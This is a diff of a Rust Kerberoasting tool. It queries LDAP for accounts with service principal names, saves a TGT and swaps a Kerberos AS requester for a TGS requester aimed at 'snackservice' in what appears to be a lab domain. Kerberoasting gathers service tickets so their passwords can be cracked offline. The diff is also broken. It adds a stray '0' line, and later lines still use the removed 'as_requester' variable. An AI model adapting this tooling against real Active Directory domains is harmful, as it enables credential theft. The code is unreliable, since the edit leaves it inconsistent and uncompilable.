@@ -1,10 +1,10 @@
 use ascii::AsciiString;
-use kerbeiros::*;
+use kerberust::*;
 use kerberos_ccache::CCache;
 use ldap3::{LdapConn, LdapResult, ResultEntry, Scope, SearchEntry, SearchResult};
 use kerberos_constants::etypes::AES256_CTS_HMAC_SHA1_96;
 use std::fs;
-use std::net::*;
+use std::net::*; 
 
 fn find_spn_accounts(
     bind_dn: &str,
@@ -120,6 +120,7 @@ pub fn kerberoast(username: &str, password: &str, domain: &str, dc_ip: &str) -> 
     println!("{:?}", result);
 
     let username = AsciiString::from_ascii(username).unwrap();
+    
     let user_password = Key::Password(password.to_string());
     // realm needs to be a box because otherwise we cannot use it twice (asciistring does not implement copy/clone 😅)
     let realm = Box::new(AsciiString::from_ascii(domain).unwrap()); //AsciiString::from_ascii("SNACKEMPIRE.HOME").unwrap();
@@ -144,8 +145,9 @@ pub fn kerberoast(username: &str, password: &str, domain: &str, dc_ip: &str) -> 
         .1;
 
     println!("TGT saved and loaded");
-
-    let mut as_requester = kerbeiros::AsRequester::new(*realm, kdc_address.clone());
+0
+    let service = AsciiString::from_ascii("snackservice").unwrap();
+    let mut tgs_requester = kerberust::TgsRequester::new(*realm, kdc_address.clone(), Some(service));
 
     // Use AES-256 cipher
     as_requester.set_etype(AES256_CTS_HMAC_SHA1_96).unwrap();
@@ -162,7 +164,7 @@ pub fn kerberoast(username: &str, password: &str, domain: &str, dc_ip: &str) -> 
         AsReqResponse::AsRep(as_rep) => {
             let ticket = as_rep.ticket;
             println!("Ticket obtained for service {}", ticket.sname);
-            println!("{:?}", ticket);
+            //println!("{:?}", ticket);
         }
     }
 
